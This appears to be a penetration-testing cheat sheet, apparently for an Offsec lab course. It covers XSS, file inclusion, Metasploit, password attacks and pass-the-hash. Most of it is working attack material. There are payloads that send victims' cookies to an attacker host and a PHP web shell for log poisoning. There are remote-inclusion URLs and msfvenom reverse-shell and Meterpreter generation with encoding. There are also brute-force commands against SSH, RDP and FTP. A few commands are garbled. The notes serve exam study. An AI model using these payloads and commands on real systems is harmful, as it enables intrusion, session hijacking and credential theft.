### Exploit sources

  In Kali: ```searchsploit slmail```

  On the web

  https://www.exploit-db.com/

  https://www.securityfocus.com/vulnerabilities

### Web application attacks

#### Cross site scripting

   Caused by unsanitized user input that is then displayed on a web page

   Need a simple example to testing for XSS with an alert

   Browser redirection and iFrame injection

    Injecting an invisible iframe

```<iframe SRC=”http://10.11.0.5/report” height= “0” width= “0”></iframe>```

   When the victim visits the page, their browser connects to the attacking machine (required netcat listener, port 80)

   Stealing cookies and session information

```<script> new Image().src=”http://10.11.0.5/bogus.php?output=”+document.cookie; </script>```

   The victim browsing the page makes a connection back to us with an authenticated session value (listener required)

   Use a cookie editor like Cookies Manager to steal the session

#### File inclusion vulnerabilities 

##### LFI

   Look for pages that include EXAMPLE in the URL

```../../../../../../windows/system32/drivers/etc/hosts```

   In PHP versions below 5.3, terminate the request with a null byte "(%00)"

   Contaminating log files

```<?php echo shell_exec($_GET[‘cmd’]);?>```

   From LFI to code execution

```http://10.11.1.35/addguestbook.php?name=a&comment=b&cmd=ipconfig&LANG=../../../../../../../xampp/apache/logs/access.log%00```

##### RFI

   Create evil.txt and setup our webserver to host it

```Evil.txt = <?php echo shell_exec(“ipconfig”);?>```

```http://10.11.1.35/addguestbook.php?name=a&comment=b&LANG=http://10.11.0.5/evil.txt%00```

#### SQL injection

See notes for examples; GitHub errors when SQLI code inserted

### Metasploit

#### Msfconsole

##### Exploring

   Start: ```msfconsole```

   View auxiliary modules: ```show auxiliary```

   Use modules: ```use auxiliary/scanner/snmp/snmp_enum```
 
   View module options: ```show options```

   Set global session values: ```setg RHOSTS 10.11.1.5```

##### Database access

   MSF logs findings and information about discovered hosts in a database

   View discovered hosts: ```hosts```

   Use the db_nmap wrapper to scan: ```db_nmap 10.11.1.5```

   Search for machines open ports: ```services -p 443```

##### Exploit modules

   Search exploits: ```search pop3```

   Use exploit: ```use exploit/windows/pop3/seattlelab_pass```

   View options:  ```show options```

   Set options: ```set RHOST 10.11.1.5```

   View payloads: ```show payloads```

   Select payload: ```set payload windows/shell/reverse_tcp```

   View payload options: ```show options```

   Once configured, run exploit:  ```exploit```

##### Meterpreter payloads – provide additional features and functionality 

   View system info: ```sysinfo```

   View UID: ```getuid```

   Search files: ```search string```

   Upload files: ```upload /usr/share/windows-binaries/nc.exe c:\\Users\\Offsec``` two \ characters required to prevent shell escaping

   Download files: ```download c:\\Windows\\system32\\calc.exe /tmp/calc.exe``` 

   Invoke a command shell: ```shell```

   Reverse HTTPS Meterpreter – like a standard meterpreter payload but the communications over the network look like normal HTTPS traffic
```Msfvenom -p windows/meterpreter/reverse_https LHOST=10.11.0.5 LPORT=443 -f exe -o met_https_reverse.exe```

##### Post exploitation 

```help``` displays a list of available meterpreter post exploitation commands

   Includes: download, upload, portfwd, route, keyscan_start/stop, screenshot, record_mic, webcam_snap, getsystem (priv esc), hashdump

```Msfvenom Create Msfvenom cheat sheet or link to Offsec```

```Msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.4 LPORT=443 -f c```

```Msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.4 LPORT=443 -f c -e x86/shikata_ga_nai -b “\x00\x0a\x0d”```

### Password attacks

#### Brute force

   Medusa HTTP 

```medusa -h 10.11.1.219 -u admin -P passwd-file.txt -M http -m DIR:/admin -T 10```

   Ncrack RDP 

```ncrack -vv –user offsec -P password-file.txt rdp://10.11.1.35```

   Hydra SNMP 

```hydra -P password-file.txt -v 10.11.1.210 snmp```

   Hydra FTP 

```hydra -l admin -P password-file.txt -v 122.168.31.219 ftp```

   Hydra SSH 

```Hydra -l root -P password-file.txt 10.11.1.219 ssh```

#### Password profiling – cewl can scrape websites to generate password lists 

```cewl www. megacorpone.com -m 6 -w megacorp-cewl.txt```

#### Password mutating – users often use mutations of their passwords (add numbers, etc.)

   John the Ripper allows the mutations through the modification of the configuration file

   To view the configuration file: ```nano/etc/john/john.conf ```

```John –wordlist=megacorp-cewl.txt –rules –stdout >mutated.txt```

#### Hash attacks

   Exporting hashes: PWDump, Fgdump, Windows Credential Editor (WCE.exe)

   Cracking hashes: John the Ripper

   Raw: ```john 127.0.0.1 pwdump (slow)```

   With wordlist: ```john –wordlist=/usr/share/wordlists/rockyou.txt```

   On Linux: combine the passwd and shadow files prior to cracking

```unshadow passwd-file.txt shadow-file.txt```

#### Passing the hash (Windows)

   Create environment variable SMBHASH, containing hash we want to pass

```export SMBHASH=hashvalue``` 

```Use pth-winexe to authenticate: pth-winexe -U administrator% //10.11.0.1.76.cmd```


